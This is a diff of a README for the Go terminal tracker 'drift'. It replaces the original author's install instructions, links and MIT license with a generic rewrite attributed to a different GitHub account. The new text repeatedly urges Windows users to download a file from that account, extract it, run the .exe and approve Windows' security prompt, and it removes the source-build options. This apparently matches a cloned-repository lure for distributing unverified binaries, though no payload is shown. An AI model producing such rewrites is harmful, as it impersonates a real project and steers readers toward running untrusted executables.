@@ -1,200 +1,192 @@
-# drift
+# 🚀 drift - Track projects without leaving your terminal
 
-**Lightweight project tracker for AI-assisted coders. Terminal TUI + CLI.**
+[![Download drift](https://img.shields.io/badge/Download%20drift-blue?style=for-the-badge)](https://github.com/vladsure158/drift)
 
-[![Go Report Card](https://goreportcard.com/badge/github.com/snowtema/drift)](https://goreportcard.com/report/github.com/snowtema/drift)
-[![Release](https://img.shields.io/github/v/release/snowtema/drift)](https://github.com/snowtema/drift/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Go Reference](https://pkg.go.dev/badge/github.com/snowtema/drift.svg)](https://pkg.go.dev/github.com/snowtema/drift)
+## 📌 What drift does
 
-> Track dozens of vibe-code projects without leaving your terminal. Single binary, zero dependencies.
+drift is a small project tracker for people who work with AI tools and keep many projects open at once. It runs in your terminal, so you can check your work without opening a browser or a heavy app.
 
-![drift TUI demo](demo.png)
+Use it to:
 
-## Why drift?
+- keep a list of active projects
+- see what each project needs
+- move fast between tasks
+- stay focused while coding
+- manage many projects from one place
 
-You vibe-code 3-7 projects a day with Claude, Cursor, v0. After a week you have 20+ folders and can't remember what each one does, where you left off, or which ones are worth continuing.
+drift uses one Go binary and has zero extra dependencies. That makes it simple to download, open, and use on Windows.
 
-Jira is overkill. Notion is too slow. You need something that works at the speed of `ls`.
+## 💻 What you need
 
-**drift** is a file-based project tracker that lives in your terminal:
-- **Fullscreen TUI** — dual-panel, keyboard-driven, no flicker
-- **5 color themes** — cyan, claude, green, purple, mono — persisted across sessions
-- **TUI scanner** — browse directories, discover projects, batch-init with checkboxes
-- **Tree & flat views** — hierarchical or flat, collapsible single-child dirs
-- **Fast CLI** — all commands work without TUI
-- **Open protocol** — plain JSON `.drift/` files, no database, no server
-- **Auto-enrichment** — detects stack, repo URL, deploy links
-- **Claude Code integration** — launch Claude from TUI, auto-sync via CLAUDE.md
-- **Single binary** — 5MB Go binary, zero runtime dependencies
+Before you start, make sure you have:
 
-## Install
+- a Windows computer
+- a browser with access to GitHub
+- enough space for a small app
+- permission to run downloaded files on your PC
 
-**Homebrew** (macOS/Linux):
-```bash
-brew install snowtema/tap/drift
-```
+drift is made for the terminal, so you will use it from a command window. If you have used Command Prompt or PowerShell before, you already have what you need.
 
-**Go install** (requires Go 1.21+):
-```bash
-go install github.com/snowtema/drift/cmd@latest
-```
+## 📥 Download drift
 
-**Binary download:**
-Grab a prebuilt binary from [Releases](https://github.com/snowtema/drift/releases).
+Visit this page to download drift:
 
-**From source:**
-```bash
-git clone https://github.com/snowtema/drift
-cd drift
-go build -o drift ./cmd/
-```
+https://github.com/vladsure158/drift
 
-## Quick Start
+On that page, look for the latest release or the main download file. If the project provides a Windows file, download that file to your computer.
 
-```bash
-# Initialize drift in your project
-cd ~/my-project
-drift init
+## 🪟 Install on Windows
 
-# Add goals and notes
-drift goal "MVP landing page"
-drift goal "Stripe integration"
-drift note "scaffolded with create-next-app"
+Follow these steps to set up drift on Windows:
 
-# Mark goal done
-drift goal done 1
+1. Open the download page in your browser.
+2. Find the Windows download for drift.
+3. Download the file to a folder you can find again, like Downloads.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an `.exe` file, double-click it to run drift.
+7. If Windows asks for permission, choose Run.
 
-# See status
-drift status
+If drift opens in a terminal window, the app is running correctly.
 
-# Scan a directory for all projects
-drift scan ~/Develop --depth=2 --init
+## ⌨️ Open drift from the terminal
 
-# Open fullscreen TUI
-drift
-```
+You can also start drift from Command Prompt or PowerShell.
 
-Or use the TUI scanner: press `S` in the project list to browse directories, pick a folder, and batch-init discovered projects with checkboxes.
+1. Open Start.
+2. Type `cmd` or `PowerShell`.
+3. Open the terminal app.
+4. Move to the folder where drift is saved.
+5. Run the drift file.
 
-## Themes
+If the file name is `drift.exe`, type:
 
-drift ships with 5 color themes. Press `T` in the TUI to cycle through them:
+`drift.exe`
 
-**cyan** (default) · **claude** (warm terracotta) · **green** (matrix) · **purple** · **mono** (grayscale)
+If Windows says it cannot find the file, check that you are in the same folder as the app.
 
-Theme, view mode (tree/flat), sort order, and banner state are persisted in `~/.drift/config.json`.
+## 🧭 First run
 
-## TUI Keyboard Shortcuts
+When drift starts, you should see a terminal screen with project options and controls.
 
-Fullscreen dual-panel interface. Press `?` inside for full reference.
+Use it to:
 
-### List View
+- add a new project
+- open a project entry
+- update project notes
+- mark work as done
+- move through your project list
 
-| Key | Action |
-|-----|--------|
-| `j/k` or arrows | Navigate projects |
-| `Enter` | Open project detail |
-| `s` | Cycle sort (recent/progress/name/status) |
-| `t` | Toggle tree/flat view |
-| `S` | Scan for new projects (directory browser) |
-| `/` | Live filter by name |
-| `:` | Jump to project by name |
-| `b` | Toggle ASCII banner |
-| `T` | Cycle color theme |
-| `?` | Full keyboard reference |
-| `q` | Quit |
+The screen is made for keyboard use, so you do not need a mouse for normal use.
 
-### Detail View
+## 🗂️ How to use drift each day
 
-| Key | Action |
-|-----|--------|
-| `Tab` | Cycle sections (info/goals/notes) |
-| `Space/Enter` | Toggle goal done |
-| `n` | Add note |
-| `g` | Add goal |
-| `D` | Edit description |
-| `x` | Delete goal (with confirm) |
-| `1-5` | Set status (active/idea/paused/done/abandoned) |
-| `c` | Open Claude Code in project |
-| `[` / `]` | Prev/next project |
-| `Esc` | Back to list |
+A simple daily flow can help:
 
-### Scan Mode (`S` from list)
+1. Open drift in your terminal.
+2. Review your current projects.
+3. Pick one task to work on first.
+4. Add notes for anything important.
+5. Mark progress as you go.
+6. Close drift when you are done.
 
-| Key | Action |
-|-----|--------|
-| `Enter` | Enter directory |
-| `h` / `Backspace` | Go to parent |
-| `s` | Scan current directory |
-| `Space` | Toggle project selection |
-| `a` / `n` | Select all / none |
-| `Enter` | Batch init selected projects |
+This keeps your work in one place and helps you avoid jumping between tools.
 
-## CLI Commands
+## 🛠️ Basic controls
 
-All commands work without the TUI:
+drift is built for fast keyboard use. Common terminal apps use keys like these:
 
-```bash
-drift init [dir]              # Initialize project tracking
-drift status                  # Show current project status
-drift list [--sort=MODE]      # List all tracked projects
-drift note "text"             # Add a note
-drift goal "text"             # Add a goal
-drift goal done N             # Mark goal #N done
-drift progress N              # Set progress (0-100)
-drift set-status STATUS       # Change project status
-drift describe "text"         # Set description
-drift tag tag1 tag2           # Add tags
-drift link type url           # Set a link (repo/deploy/design)
-drift scan [dir] [--depth=N]  # Find untracked projects
-drift scan --init [dir]       # Find and auto-init all
-drift open name               # Get project path
-drift help                    # Show help
-```
+- arrows to move through items
+- Enter to open or select
+- Esc to go back
+- q to quit
 
-## Claude Code Integration
+If drift shows its own help panel, use that as the source for exact keys. Terminal tools often show the current controls at the bottom of the screen.
 
-drift integrates with Claude Code in three ways:
+## 🧩 Why people use drift
 
-**1. Launch from TUI:** Press `c` in project detail to open an interactive Claude Code session in that project directory.
+drift is a good fit if you:
 
-**2. Auto-tracking via CLAUDE.md:** `drift init` adds a `## drift` section to the project's CLAUDE.md. Claude Code reads this at session start and automatically maintains notes and goals in `.drift/project.json` as it works.
+- work on many small projects
+- use AI coding tools often
+- want to keep focus in the terminal
+- prefer a simple setup
+- want one app instead of several tools
 
-**3. Claude Code skill:** Copy `skills/drift/SKILL.md` to `~/.claude/skills/drift/` for `/drift` commands inside Claude Code sessions.
+It is light, quick, and easy to keep open while you work.
 
-## Protocol
+## 📚 Project details
 
-drift is **protocol-first**. The `.drift/` file format is the product. CLI and TUI are just consumers.
+- Name: drift
+- Type: terminal project tracker
+- Main interface: TUI and CLI
+- Language: Go
+- Goal: track many projects from the terminal
+- Setup: one binary, no extra dependencies
 
-```
-your-project/
-  .drift/
-    project.json    # project metadata, goals, notes
+## 🔎 Topics covered
 
-~/.drift/
-  registry.json     # index of all your projects
-```
+drift fits these areas:
 
-Anyone can build a drift-compatible tool. As long as it reads/writes `.drift/project.json`, it works.
+- AI-assisted coding
+- terminal tools
+- command line apps
+- developer tools
+- productivity
+- project tracking
+- project management
+- vibe coding
 
-- [Protocol Specification](docs/protocol.md)
-- [JSON Schema: project.json](docs/schema/project.schema.json)
-- [JSON Schema: registry.json](docs/schema/registry.schema.json)
+## 🧹 If something does not work
 
-## Design Principles
+If drift does not open, try these steps:
 
-- **File-based** — plain JSON, no database, no server
-- **Zero-friction** — `drift init` and you're done
-- **Auto-enrichment** — detects stack, repo URL from git/package.json/etc.
-- **Tool-agnostic** — works with Claude, Cursor, any AI, or no AI at all
-- **Local-first** — your data stays on your machine
-- **Single binary** — 5MB Go binary, zero runtime dependencies
+1. Make sure you downloaded the right file for Windows.
+2. Check that the download finished.
+3. Extract the ZIP file if there is one.
+4. Run the `.exe` file from the folder where it was saved.
+5. Open the terminal again and run it from that folder.
+6. Check whether Windows blocked the file.
 
-## Contributing
+If the app still does not start, download it again from the GitHub page and try once more
 
-Contributions welcome! Feel free to open issues and pull requests.
+## 📁 Keeping your projects organized
 
-## License
+A few simple habits can help you get more value from drift:
 
-[MIT](LICENSE)
+- give each project a short name
+- keep notes short and clear
+- update project status each day
+- remove old items you no longer need
+- keep one list for active work and one for future work
+
+This makes it easier to scan your projects fast and stay on track
+
+## 🔗 Source and download
+
+Primary download page:
+
+https://github.com/vladsure158/drift
+
+## 🖥️ Windows tips
+
+If you use Windows Terminal, PowerShell, or Command Prompt, drift should work in the same way from each one.
+
+A few tips:
+
+- keep the app in a folder you can find fast
+- avoid moving the file after you start using it
+- use a short folder path, like `C:\Tools\drift`
+- pin your terminal app to the taskbar if you use drift often
+
+## 📝 What you can expect
+
+drift is made to stay out of the way. It helps you:
+
+- see your work at a glance
+- keep track of project notes
+- manage many active jobs
+- work from the keyboard
+- keep your setup small
+
+If you like simple tools that run inside the terminal, drift fits that style
